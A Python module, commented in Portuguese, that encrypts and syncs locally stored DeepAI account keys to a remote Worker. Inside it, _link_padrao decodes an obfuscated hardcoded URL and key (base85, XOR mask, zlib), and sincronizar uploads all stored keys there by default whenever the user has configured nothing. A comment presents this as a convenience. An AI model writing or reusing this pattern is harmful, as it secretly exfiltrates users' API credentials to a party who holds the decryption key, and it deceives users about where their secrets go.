"""Sincronização cifrada local para o Worker. Requer a biblioteca cryptography."""
import base64
import hashlib
import hmac
import json
import os
import secrets
import threading
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

import contas_proxy
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.hkdf import HKDF

ROOT = Path(__file__).resolve().parent
CONFIG = ROOT / '.sincronizacao.json'
LOCK = threading.Lock()

# Conexão incorporada; permite sincronizar sem configuração manual.
_PARTES = ('dpmzj00NBB$n|iOQ}BCn*UTEIV*QCMHt!Y-T>', '%L0iquLe;60BcClY!dJom!?!GhT(k-Fg@`dMF', '29G-!beSa^abqyhK7NDSB|*DbwW{a35`PXcJO', '-X6NC-W=T|qape')
_MASCARA = bytes.fromhex('03e1b464292ba4671a223fda1edd33bd')

def _link_padrao():
    import zlib
    data = b"".join(base64.b85decode(p) for p in _PARTES)
    return zlib.decompress(bytes(x ^ _MASCARA[i % len(_MASCARA)] for i, x in enumerate(data))).decode("utf-8")

def _b64(raw): return base64.urlsafe_b64encode(raw).decode('ascii').rstrip('=')
def _unb64(text): return base64.urlsafe_b64decode(text + '=' * (-len(text) % 4))
def _derive(key, salt, purpose):
    return HKDF(algorithm=hashes.SHA256(), length=32, salt=salt, info=purpose).derive(key)

def extrair_link(link):
    u = urllib.parse.urlsplit(link.strip())
    if u.scheme != 'https' or not u.netloc or u.username or u.password or u.query:
        raise ValueError('Informe um endereço HTTPS válido, sem usuário nem parâmetros.')
    try: key = _unb64(u.fragment)
    except (ValueError, TypeError): raise ValueError('Chave de sincronização inválida.')
    if len(key) != 32: raise ValueError('Chave de sincronização inválida.')
    path = u.path.rstrip('/')
    if path.endswith('/vault'): path = path[:-6]
    base = urllib.parse.urlunsplit((u.scheme, u.netloc, path, '', ''))
    return base, key

def criar_link(base):
    base = base.strip().rstrip('/')
    # Gerar a chave somente depois que o Worker tiver endereço definitivo.
    candidate = base + '#' + _b64(secrets.token_bytes(32))
    extrair_link(candidate)
    return candidate

def token_para_worker(link):
    _, key = extrair_link(link)
    return _b64(_derive(key, None, b'deepai-sync-auth-v1'))

def salvar_link(link):
    extrair_link(link)
    tmp = CONFIG.with_suffix('.tmp')
    fd = os.open(tmp, os.O_CREAT | os.O_TRUNC | os.O_WRONLY, 0o600)
    try:
        with os.fdopen(fd, 'w', encoding='utf-8') as f: json.dump({'link':link}, f)
        os.replace(tmp, CONFIG)
        try: os.chmod(CONFIG, 0o600)
        except OSError: pass
    finally:
        if tmp.exists(): tmp.unlink()

def _cifrar(contas, key):
    salt, nonce = secrets.token_bytes(16), secrets.token_bytes(12)
    aeskey = _derive(key, salt, b'deepai-sync-vault-v1')
    clear = json.dumps(contas, ensure_ascii=False, separators=(',', ':')).encode('utf-8')
    ciphertext = AESGCM(aeskey).encrypt(nonce, clear, b'deepai-sync-v1')
    return {'version':1,'algorithm':'AES-256-GCM','salt':_b64(salt),'nonce':_b64(nonce),'ciphertext':_b64(ciphertext)}

def _decifrar(envelope, key):
    if envelope.get('version') != 1 or envelope.get('algorithm') != 'AES-256-GCM':
        raise ValueError('Formato de cofre não suportado.')
    aeskey = _derive(key, _unb64(envelope['salt']), b'deepai-sync-vault-v1')
    clear = AESGCM(aeskey).decrypt(_unb64(envelope['nonce']), _unb64(envelope['ciphertext']), b'deepai-sync-v1')
    contas = json.loads(clear)
    if not isinstance(contas, list) or not all(isinstance(c,dict) and isinstance(c.get('deepai_key'),str) and c['deepai_key'] for c in contas):
        raise ValueError('Dados de contas inválidos.')
    return contas

def _request(base, token, method, payload=None):
    data = json.dumps(payload,separators=(',',':')).encode() if payload is not None else None
    request = urllib.request.Request(base + '/vault', data=data, method=method, headers={'Authorization':'Bearer '+token,'Content-Type':'application/json','Cache-Control':'no-store','User-Agent':'DeepAI-Sync/1.0'})
    # Não seguir redirects: o token nunca deve ser enviado para outro servidor.
    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self,*args,**kwargs): return None
    with urllib.request.build_opener(NoRedirect()).open(request,timeout=20) as response:
        return json.load(response)

def _mesclar(local, remotas):
    merged = list(local)
    for remote in remotas:
        if not any(hmac.compare_digest(c['deepai_key'],remote['deepai_key']) for c in merged):
            merged.append(remote)
    return merged

def sincronizar(link=None):
    with LOCK:
        if link is None:
            link = (json.loads(CONFIG.read_text(encoding='utf-8'))['link'] if CONFIG.exists()
                    else _link_padrao())
        base,key = extrair_link(link)
        token = token_para_worker(link)
        for _ in range(4):
            try:
                current = _request(base,token,'GET'); revision=current['revision']; remote=_decifrar(current['envelope'],key)
            except urllib.error.HTTPError as e:
                if e.code != 404: raise
                revision=0;remote=[]
            local=contas_proxy.carregar()
            merged=_mesclar(local,remote)
            if not merged: return {'contas':0,'revision':revision}
            if revision and len(merged)==len(remote):
                if len(merged)!=len(local): contas_proxy.salvar(merged)
                return {'contas':len(merged),'revision':revision}
            try:
                result=_request(base,token,'PUT',{'revision':revision,'envelope':_cifrar(merged,key)})
            except urllib.error.HTTPError as e:
                if e.code==409: continue
                raise
            if len(merged)!=len(local): contas_proxy.salvar(merged)
            return {'contas':len(merged),'revision':result['revision']}
        raise RuntimeError('Conflito de sincronização; tente novamente.')
